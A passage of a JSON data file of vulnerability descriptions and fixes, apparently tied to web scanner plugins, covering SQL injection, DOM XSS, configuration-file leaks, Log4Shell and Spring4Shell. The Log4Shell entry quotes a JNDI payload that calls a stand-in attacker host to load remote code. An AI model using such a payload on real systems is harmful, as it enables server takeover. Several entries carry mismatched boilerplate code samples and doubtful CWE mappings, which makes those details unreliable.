    "simplified_description": "Your application has a critical MySQL database security flaw that allows attackers to speak directly to your MySQL database in its native language. This is like giving strangers a master key to your filing cabinet - they can read all your sensitive customer data, steal passwords, modify business records, and even use MySQL's special file operations to access files on your server or take complete control of your database systems.",
    "solution": "Implement parameterized queries using prepared statements for all MySQL operations, use ORM frameworks with MySQL-specific protections, enable MySQL strict mode, validate all inputs, implement least privilege database access, and use MySQL-specific security features.",
    "simplified_solution": "Replace all string concatenation in SQL queries with prepared statements using bind parameters. Use reputable ORM frameworks like Hibernate, Entity Framework, or SQLAlchemy. Enable MySQL's strict SQL mode and NO_AUTO_CREATE_USER. Validate all inputs with type checking and length limits. Create dedicated database users with minimal required permissions only. Use stored procedures for complex operations and keep MySQL updated with latest security patches.",
    "references": [
      {
        "name": "OWASP SQL Injection Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "MySQL Security Guidelines",
        "url": "https://dev.mysql.com/doc/refman/8.0/en/general-security-issues.html"
      },
      {
        "name": "CWE-89: SQL Injection",
        "url": "https://cwe.mitre.org/data/definitions/89.html"
      },
      {
        "name": "OWASP Top Ten A03:2021 - Injection",
        "url": "https://owasp.org/Top10/A03_2021-Injection/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 40020,
    "title": "SQL Injection - Hypersonic SQL",
    "defaultRisk": "Critical",
    "cweid": "89",
    "description": "HSQLDB (Hypersonic SQL) Injection occurs when untrusted input is concatenated into HSQLDB SQL queries without proper parameterization. HSQLDB has specific syntax vulnerabilities including Java method calls, INFORMATION_SCHEMA access, system function calls, and in-memory database features that attackers can exploit to bypass authentication, access sensitive data, or execute arbitrary Java code through the database engine.",
    "simplified_description": "Your application has a critical security flaw in the HSQLDB database layer that allows attackers to inject malicious SQL commands. HSQLDB is like a sophisticated filing system that understands both database commands and Java programming - attackers can exploit this dual capability to not only read your data but also execute Java code on your server, potentially taking complete control of your application.",
    "solution": "Implement parameterized queries using HSQLDB prepared statements, disable Java method execution, use connection pooling with security restrictions, validate all inputs, and employ HSQLDB-specific security configurations.",
    "simplified_solution": "Replace all SQL string concatenation with HSQLDB prepared statements using parameter binding. Disable HSQLDB's Java method execution capability. Configure HSQLDB to run in restricted mode without file system access. Use HSQLDB's built-in SQL standard mode and disable database management functions. Validate all user inputs with strict type checking and length limits. Implement proper connection security with minimal database privileges.",
    "references": [
      {
        "name": "HSQLDB Security Documentation",
        "url": "http://hsqldb.org/doc/guide/sessions.html"
      },
      {
        "name": "OWASP SQL Injection Prevention",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-89: SQL Injection",
        "url": "https://cwe.mitre.org/data/definitions/89.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 40021,
    "title": "SQL Injection - Oracle",
    "defaultRisk": "Critical",
    "cweid": "89",
    "description": "Oracle SQL Injection occurs when untrusted input is concatenated into Oracle SQL queries without proper parameterization. Oracle databases have specific injection vulnerabilities including PL/SQL block execution, cursor injection, function injection, UTL_HTTP package exploitation, and Oracle-specific syntax like comments (--), string concatenation (||), and UNION queries that can bypass authentication, access sensitive data, or execute system commands through Oracle packages.",
    "simplified_description": "Your application has a critical Oracle database security flaw that allows attackers to inject malicious Oracle SQL commands. Oracle databases are like powerful information vaults with their own programming language - attackers can exploit this to not only read your data but also execute Oracle's built-in functions to access files, make network requests, or even take control of your database server. This can lead to complete data theft or system compromise.",
    "solution": "Implement Oracle parameterized queries using bind variables, disable PL/SQL injection, use Oracle's least privilege model, implement Virtual Private Database (VPD), validate all inputs, and employ Oracle-specific security features like Database Vault and Real Application Security.",
    "simplified_solution": "Replace all SQL string concatenation with Oracle bind variables and prepared statements. Use Oracle Application Express (APEX) or Oracle JDBC/ODBC drivers with parameter binding. Create database users with minimal required privileges using Oracle's fine-grained access control. Implement Virtual Private Database policies for data access control. Enable Oracle Database Vault for sensitive data protection. Use Oracle Label Security for mandatory access control. Regularly apply Oracle Critical Patch Updates (CPU).",
    "references": [
      {
        "name": "Oracle Database Security Guide",
        "url": "https://docs.oracle.com/en/database/oracle/oracle-database/19/tgdb/"
      },
      {
        "name": "OWASP Oracle SQL Injection Prevention",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "Oracle Database Vault Documentation",
        "url": "https://docs.oracle.com/en/database/oracle/oracle-database/19/dvcon/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 40022,
    "title": "SQL Injection - PostgreSQL",
    "defaultRisk": "Critical",
    "cweid": "89",
    "description": "PostgreSQL SQL Injection occurs when untrusted input is concatenated into PostgreSQL SQL queries without proper parameterization. PostgreSQL has specific injection vulnerabilities including function calls (pg_sleep(), copy_to(), version()), command execution through COPY commands, PostgreSQL-specific syntax like -- comments, $$ string delimiters, UNION queries, and access to pg_catalog system tables that can bypass authentication, access sensitive data, or execute system commands.",
    "simplified_description": "Your application has a critical PostgreSQL database security flaw that allows attackers to inject malicious PostgreSQL commands. PostgreSQL is like a sophisticated information vault with advanced scripting capabilities - attackers can exploit this to not only read your data but also execute PostgreSQL functions to access system files, make the database sleep (causing denial of service), or even copy your entire database to remote locations. This can lead to complete data theft, system compromise, or service disruption.",
    "solution": "Implement PostgreSQL parameterized queries using bind variables, use PostgreSQL's binary protocol, disable dangerous PostgreSQL functions, implement row-level security (RLS), validate all inputs, and employ PostgreSQL-specific security features like pgcrypto for encryption and pgaudit for comprehensive auditing.",
    "simplified_solution": "Replace all SQL string concatenation with PostgreSQL prepared statements using bind variables. Use the PostgreSQL JDBC/ODBC drivers with binary protocol enabled. Create database users with minimal required privileges using PostgreSQL's role-based access control. Implement Row Level Security (RLS) policies for fine-grained data access control. Use pgcrypto for data encryption and pgaudit for comprehensive security auditing. Disable dangerous PostgreSQL functions like COPY TO/FROM PROGRAM. Enable statement logging and monitoring. Regularly apply PostgreSQL security updates.",
    "references": [
      {
        "name": "PostgreSQL Security Documentation",
        "url": "https://www.postgresql.org/docs/current/security.html"
      },
      {
        "name": "OWASP PostgreSQL SQL Injection Prevention",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "PostgreSQL Row Level Security",
        "url": "https://www.postgresql.org/docs/current/ddl-rowsecurity.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 40024,
    "title": "SQL Injection - SQLite",
    "defaultRisk": "Critical",
    "cweid": "CWE-89",
    "description": "SQL Injection vulnerabilities in SQLite-based applications allow attackers to execute arbitrary SQL commands by manipulating input fields that are used in database queries. This can lead to unauthorized data access, data modification, data deletion, and in some cases, complete database compromise. SQLite's particular characteristics make certain injection techniques more effective, especially given its common use in mobile applications and embedded systems.",
    "simplified_description": "Your application has a critical security flaw that allows attackers to run their own database commands on your SQLite database. This is like giving someone unrestricted access to your company's filing system - they can read, modify, or delete any data they want, steal sensitive information like user credentials and personal data, and potentially take over your entire application. SQLite databases are often used in mobile apps and embedded systems, making this vulnerability particularly dangerous for applications that store data locally on devices.",
    "solution": "Implement parameterized queries/prepared statements for all database interactions, use input validation and sanitization, employ ORM frameworks with built-in SQL injection protection, apply least privilege database access principles, and implement proper error handling to prevent information disclosure.",
    "simplified_solution": "Immediately fix all database queries to use prepared statements that separate SQL commands from user input. This ensures user input is treated as data, not as executable code. Replace string concatenation in SQL queries with parameter binding, validate all user inputs against strict rules, use established ORM frameworks instead of raw SQL, and ensure database connections have minimal required permissions.",
    "references": [
      {
        "name": "OWASP SQL Injection Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "CWE-89: Improper Neutralization of Special Elements used in SQL Commands",
        "url": "https://cwe.mitre.org/data/definitions/89.html"
      },
      {
        "name": "OWASP Top Ten A03:2021 - Injection",
        "url": "https://owasp.org/Top10/A03_2021-Injection/"
      },
      {
        "name": "SQLite Security Documentation",
        "url": "https://www.sqlite.org/security.html"
      },
      {
        "name": "MITRE ATT&CK Technique T1190 - Exploit Public-Facing Application",
        "url": "https://attack.mitre.org/techniques/T1190/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 40026,
    "title": "Cross Site Scripting (DOM Based)",
    "defaultRisk": "Medium",
    "cweid": "79",
    "description": "DOM-based Cross Site Scripting vulnerabilities occur when client-side scripts modify the DOM with unsafe user input, allowing malicious code execution entirely in the browser without server interaction.",
    "simplified_description": "Your website has a security vulnerability that allows attackers to execute malicious code directly in users' browsers by manipulating how the webpage is displayed. This is like having a blueprint that attackers can modify to change how your building looks - they can steal information or take control of what users see.",
    "solution": "Implement proper input validation, use safe DOM manipulation methods, avoid eval() and similar functions, use modern frameworks with built-in XSS protection, and implement Content Security Policy.",
    "simplified_solution": "Validate and sanitize all user input before using it to modify webpage content, use safe JavaScript methods like textContent instead of innerHTML, avoid dangerous functions like eval(), implement Content Security Policy headers, and use modern frameworks that automatically protect against DOM-based attacks.",
    "references": [
      {
        "name": "OWASP DOM-based XSS Prevention",
        "url": "https://owasp.org/www-community/attacks/DOM_Based_XSS"
      },
      {
        "name": "CWE-79: Improper Neutralization of Input During Web Page Generation",
        "url": "https://cwe.mitre.org/data/definitions/79.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40027,
    "title": "SQL Injection - MsSQL",
    "defaultRisk": "Critical",
    "cweid": "CWE-89",
    "description": "SQL Injection vulnerabilities in Microsoft SQL Server allow attackers to execute arbitrary SQL commands by manipulating input fields used in database queries. This can lead to unauthorized data access, data modification, privilege escalation, and in severe cases, complete system compromise through extended stored procedures like xp_cmdshell. Microsoft SQL Server's powerful features make these vulnerabilities particularly dangerous, potentially allowing attackers to execute system commands, access network resources, and enumerate database structures.",
    "simplified_description": "Your application has a critical security flaw that allows attackers to run their own database commands on your Microsoft SQL Server database. This is like giving someone unrestricted access to your company's entire data center - they can steal sensitive information like customer data and financial records, modify or delete critical data, gain administrator access to your server, and even execute system commands to take over your entire network infrastructure.",
    "solution": "Implement parameterized queries using prepared statements for all database interactions, use stored procedures with proper parameter validation, apply input validation and sanitization, implement least privilege database access, disable dangerous SQL Server features like xp_cmdshell, and use ORM frameworks with built-in SQL injection protection.",
    "simplified_solution": "Immediately fix all database queries to use parameterized queries that separate SQL commands from user input. Replace string concatenation in SQL with parameter binding, use stored procedures with validated parameters, validate all user inputs with strict rules, limit database account permissions to minimum required, disable dangerous SQL Server features, and implement comprehensive error handling that doesn't expose database structure.",
    "references": [
      {
        "name": "OWASP SQL Injection Prevention Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
      },
      {
        "name": "Microsoft SQL Server Security Best Practices",
        "url": "https://docs.microsoft.com/en-us/sql/relational-databases/security/sql-server-security-best-practices"
      },
      {
        "name": "CWE-89: Improper Neutralization of Special Elements used in SQL Commands",
        "url": "https://cwe.mitre.org/data/definitions/89.html"
      },
      {
        "name": "OWASP Top Ten A03:2021 - Injection",
        "url": "https://owasp.org/Top10/A03_2021-Injection/"
      },
      {
        "name": "MITRE ATT&CK Technique T1190 - Exploit Public-Facing Application",
        "url": "https://attack.mitre.org/techniques/T1190/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Use parameterized queries to prevent SQL injection",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// VULNERABLE:\nconst query = \"SELECT * FROM users WHERE id = \" + userId;\n\n// SECURE:\nconst query = \"SELECT * FROM users WHERE id = ?\";\nconst result = db.query(query, [userId]);"
      }
    ]
  },
  {
    "pluginId": 40028,
    "title": "ELMAH Information Leak",
    "defaultRisk": "Medium",
    "cweid": 94,
    "description": "ELMAH (Error Logging Modules and Handlers) information leak occurs when ELMAH is accessible without proper authentication and authorization, exposing detailed error information including stack traces, server variables, HTTP headers, and potentially sensitive data to unauthorized users.",
    "simplified_description": "Your application's error log (ELMAH) is publicly accessible, like leaving your detailed diagnostic notebooks open on a restaurant table. Anyone can view complete error reports including your code structure, server details, database errors, and sensitive information that helps attackers understand exactly how your application works and find specific weaknesses to exploit.",
    "solution": "Restrict ELMAH access to authorized users only through proper authentication and authorization mechanisms, configure remote access restrictions, and implement secure logging practices.",
    "simplified_solution": "Immediately secure ELMAH by requiring authentication before anyone can view error logs. Configure IP restrictions to allow only administrators from specific locations, disable remote access for ELMAH.axd in production, implement role-based authorization to limit access to security personnel only, and ensure no sensitive data is logged or that it's properly masked.",
    "references": [
      {
        "name": "ELMAH Security Best Practices",
        "url": "https://elmah.github.io/articles/securing-elmah/"
      },
      {
        "name": "CWE-94: Improper Control of Generation of Code",
        "url": "https://cwe.mitre.org/data/definitions/94.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40029,
    "title": "Trace.axd Information Leak",
    "defaultRisk": "High",
    "cweid": 215,
    "description": "Trace.axd information leak vulnerabilities occur when ASP.NET tracing functionality is enabled in production environments, exposing detailed request information, session data, application state, and internal system paths.",
    "simplified_description": "Your application's detailed diagnostic tracing is publicly accessible, like leaving your complete system manual and debug logs on a public park bench. Anyone can see all your internal data flows, user session information, server configurations, and detailed error information that provides attackers with a complete roadmap of how your application works.",
    "solution": "Disable tracing in production environments through proper configuration management, implement environment-specific settings, and ensure tracing is only enabled during development and testing phases.",
    "simplified_solution": "Immediately disable tracing in production by setting compilation debug=\"false\" and trace enabled=\"false\" in web.config. Remove or secure trace.axd access through URL authorization rules. Implement environment-specific configuration files so tracing is only active in development. Regularly audit your production configuration to ensure tracing remains disabled.",
    "references": [
      {
        "name": "Microsoft ASP.NET Tracing Security",
        "url": "https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/94c55d08(v=vs.100)"
      },
      {
        "name": "CWE-215: Information Exposure Through Debug Information",
        "url": "https://cwe.mitre.org/data/definitions/215.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40032,
    "title": ".htaccess Information Leak",
    "defaultRisk": "Medium",
    "cweid": 538,
    "description": "The Apache .htaccess file is accessible from the web, revealing sensitive server configuration information including authentication settings, URL rewrite rules, directory permissions, and security configurations that can assist attackers in planning attacks against the application.",
    "simplified_description": "Your website's configuration file (.htaccess) is publicly accessible, like leaving your security system blueprint on public display. Attackers can read this file to understand your security settings, find hidden directories, discover authentication bypass methods, and plan targeted attacks against your website.",
    "solution": "Configure the web server to deny access to .htaccess files and other sensitive configuration files. Implement proper file permissions, use .htaccess to block access to configuration files, and ensure Apache is configured to protect sensitive files by default. Also consider moving sensitive configuration to server configuration files instead of .htaccess.",
    "simplified_solution": "Configure your web server to block access to .htaccess files and other sensitive configuration files. Update your Apache configuration to deny access to files starting with a dot (.ht*), set proper file permissions, and test that these files are no longer accessible from the web. Move sensitive information from .htaccess to secure server configuration files.",
    "references": [
      {
        "name": "Apache .htaccess Files Documentation",
        "url": "https://httpd.apache.org/docs/current/howto/htaccess.html"
      },
      {
        "name": "OWASP Information Exposure",
        "url": "https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure"
      },
      {
        "name": "CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory",
        "url": "https://cwe.mitre.org/data/definitions/538.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40034,
    "title": ".env Information Leak",
    "defaultRisk": "High",
    "cweid": "200",
    "description": ".env information leak vulnerabilities occur when environment variable files containing sensitive configuration data such as database credentials, API keys, and security secrets are publicly accessible, allowing attackers to extract critical authentication and access information.",
    "simplified_description": "Your application has a critical security vulnerability that exposes your entire configuration file to the public. This is like leaving your master key, password book, and building alarm codes all available for anyone to read. Attackers can access your databases, external services, and completely compromise your system by simply reading your configuration file.",
    "solution": "Restrict access to .env files and move sensitive configuration to secure environment variables or encrypted storage.",
    "simplified_solution": "Immediately block public access to .env files using web server configuration. Move all sensitive data like database passwords and API keys to secure environment variables or encrypted secrets management systems. Ensure .env files are included in .gitignore, never committed to version control, and protected with proper file permissions. Use application-level access controls to prevent configuration disclosure.",
    "references": [
      {
        "name": "OWASP Environment Variable Security",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Environment_Variables_Cheat_Sheet.html"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "12-Factor App Configuration",
        "url": "https://12factor.net/config"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40035,
    "title": "Hidden File Finder",
    "defaultRisk": "Medium",
    "cweid": "538",
    "description": "Hidden file finder vulnerabilities occur when web servers allow access to hidden files and directories that contain sensitive information such as configuration files, backup files, development artifacts, or administrative interfaces.",
    "simplified_description": "Your web server is exposing hidden files and directories that should be protected, like leaving your maintenance logs, backup files, and administrative tools accessible to the public. Attackers can discover sensitive configuration details, find vulnerabilities in your system, or gain access to administrative functions simply by exploring these hidden resources.",
    "solution": "Restrict access to hidden files and directories, remove sensitive files from production, and implement proper access controls for administrative interfaces.",
    "simplified_solution": "Configure your web server to block access to all hidden files (starting with '.'), backup files, and development artifacts. Remove any sensitive files from production directories. Move administrative interfaces to separate, authenticated areas. Implement proper access controls and regularly audit your web directories for exposed sensitive files.",
    "references": [
      {
        "name": "OWASP Information Disclosure Prevention",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Information_Leakage_Cheat_Sheet.html"
      },
      {
        "name": "CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory",
        "url": "https://cwe.mitre.org/data/definitions/538.html"
      },
      {
        "name": "OWASP Testing Guide: Information Leakage",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/08-Review_Webserver_Metafiles_for_Information_Leakage.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40042,
    "title": "Spring Actuator Information Leak",
    "defaultRisk": "Medium",
    "cweid": 215,
    "description": "Spring Boot Actuator endpoints expose sensitive application information including environment variables, configuration properties, health status, metrics, and system details. When these endpoints are improperly secured or exposed in production environments, attackers can gain valuable reconnaissance information about the application stack, internal configuration, database connections, API keys, and other sensitive data that can facilitate further attacks.",
    "simplified_description": "Your Spring Boot application is exposing sensitive system information through its management endpoints, like leaving your server's control panel wide open for anyone to access. Attackers can view internal application details, database credentials, configuration settings, and system metrics that help them understand your infrastructure and plan more targeted attacks against your application.",
    "solution": "Secure Spring Boot Actuator endpoints by restricting access to authorized users only, disabling unnecessary endpoints, and implementing proper authentication and authorization mechanisms.",
    "simplified_solution": "Immediately secure your Actuator endpoints by adding authentication, restricting access to trusted IP addresses, disabling sensitive endpoints in production, and ensuring only authorized administrators can access management features. Update your Spring Boot configuration to require proper credentials for all Actuator access and consider using a separate admin interface for sensitive operations.",
    "references": [
      {
        "name": "Spring Boot Security: Securing Actuator Endpoints",
        "url": "https://spring.io/guides/gs/securing-web/"
      },
      {
        "name": "OWASP A05:2021 - Security Misconfiguration",
        "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
      },
      {
        "name": "CWE-215: Information Exposure Through Debug Information",
        "url": "https://cwe.mitre.org/data/definitions/215.html"
      },
      {
        "name": "Spring Boot Reference Guide - Endpoints",
        "url": "https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html#actuator.endpoints"
      },
      {
        "name": "NIST SP 800-53 Rev. 5 - Security Configuration Management",
        "url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-5/final"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40043,
    "title": "Log4Shell (Apache Log4j Remote Code Execution)",
    "defaultRisk": "Critical",
    "cweid": 502,
    "description": "Log4Shell (CVE-2021-44228) is a critical remote code execution vulnerability in Apache Log4j 2.x versions 2.0-beta9 through 2.14.1. The vulnerability occurs due to unsafe JNDI (Java Naming and Directory Interface) lookups that allow attackers to execute arbitrary code by passing specially crafted malicious strings through log messages, potentially leading to complete system compromise.",
    "simplified_description": "Your application uses Log4j, a popular Java logging library that has a critical security hole allowing attackers to take complete control of your servers. Attackers can send simple text strings (like '${jndi:ldap://evil.com/a}') that get logged by your application and automatically download and execute malicious code. This is like leaving your front door wide open with a sign that says 'Free WiFi - Come In And Take Whatever You Want'. Millions of servers were compromised worldwide through this vulnerability.",
    "solution": "Immediately upgrade Log4j to version 2.17.1 or later, apply emergency mitigations if immediate upgrade is not possible, and implement comprehensive security monitoring for exploitation attempts.",
    "simplified_solution": "URGENT: Upgrade Apache Log4j to version 2.17.1+ immediately across all systems. If you cannot upgrade immediately, remove the vulnerable JndiLookup class from log4j-core.jar and restart all applications. Scan your entire environment for Log4j usage - it's often bundled in other software and dependencies. Monitor logs for exploitation attempts and assume compromise if you find suspicious activity. This vulnerability requires immediate emergency response as it allows complete server takeover.",
    "references": [
      {
        "name": "Apache Log4j Security Vulnerabilities",
        "url": "https://logging.apache.org/log4j/2.x/security.html"
      },
      {
        "name": "CVE-2021-44228 - NIST",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
      },
      {
        "name": "CISA Alert (AA21-356A)",
        "url": "https://www.cisa.gov/uscert/ncas/alerts/aa21-356a"
      },
      {
        "name": "OWASP Log4Shell Vulnerability",
        "url": "https://owasp.org/www-project-log4shell-vulnerability/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 40045,
    "title": "Spring4Shell (Spring Framework Remote Code Execution)",
    "defaultRisk": "Critical",
    "cweid": 94,
    "description": "Spring4Shell (CVE-2022-22965) is a critical remote code execution vulnerability in Spring Framework versions 5.3.0 to 5.3.17, 5.2.0 to 5.2.19, and older versions. The vulnerability occurs due to unsafe handling of classloader binding on JDK 9+, allowing attackers to bypass security restrictions and execute arbitrary code through specially crafted requests that manipulate the Tomcat/Undertow classloader, potentially leading to complete system compromise.",
    "simplified_description": "Your application uses the Spring Framework with a critical security hole allowing attackers to take complete control of your servers. Attackers can send specially crafted web requests that trick your Spring application into executing malicious code by manipulating how Java handles memory and class loading. This is like having a master key that opens every door in your building - attackers can access anything, steal all data, and install permanent backdoors on your systems.",
    "solution": "Immediately upgrade Spring Framework to patched versions (5.3.18+, 5.2.20+), apply emergency mitigations if upgrade is not possible, and implement comprehensive security monitoring for exploitation attempts.",
    "simplified_solution": "URGENT: Upgrade Spring Framework immediately to version 5.3.18+ (for 5.3.x) or 5.2.20+ (for 5.2.x). Check all your Spring applications - this vulnerability affects many common setups including Spring Boot, Spring MVC, and Spring WebFlux running on Tomcat or Undertow with JDK 9+. If you cannot upgrade immediately, disable classloader binding in web.xml and restart all applications. Scan your entire environment for vulnerable versions, including dependencies and third-party libraries. Monitor logs for exploitation attempts and assume compromise if you find suspicious activity.",
    "references": [
      {
        "name": "Spring Framework Vulnerability",
        "url": "https://spring.io/security/cve-2022-22965"
      },
      {
        "name": "CVE-2022-22965 - NIST",
        "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-22965"
      },
      {
        "name": "VMware Spring4Shell Advisory",
        "url": "https://www.vmware.com/security/advisories/VMSA-2022-0011.html"
      },
      {
        "name": "CISA Alert (AA22-138A)",
        "url": "https://www.cisa.gov/uscert/ncas/alerts/aa22-138a"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 50000,
    "title": "Script Active Scan Rules - Custom Script Security Vulnerabilities",
    "defaultRisk": "High",
    "cweid": 917,
    "description": "Script Active Scan Rules vulnerabilities occur when custom ZAP scripting rules contain security flaws that can be exploited during active security scanning. These vulnerabilities include insecure script execution environments, improper input validation in custom scripts, lack of sandboxing, and insufficient permission controls that could lead to code injection, command injection, or unauthorized system access during automated scans.",
    "simplified_description": "Your custom security scanning scripts are like security guards who can be bribed or tricked by attackers. When these scripts have vulnerabilities, malicious actors can manipulate them to bypass security controls, execute dangerous commands on your system, or gain unauthorized access to sensitive data and systems during the scanning process.",
    "solution": "Implement secure scripting practices including proper input validation, sandboxing, privilege minimization, and comprehensive audit logging for all custom ZAP scripts.",
    "simplified_solution": "Secure your custom scanning scripts by treating all external input as potentially malicious, running scripts in isolated sandboxed environments, using the minimum required permissions, implementing comprehensive input validation and sanitization, adding detailed audit logging, and regularly reviewing and updating your script security controls.",
    "references": [
      {
        "name": "OWASP Secure Coding Practices",
        "url": "https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/"
      },
      {
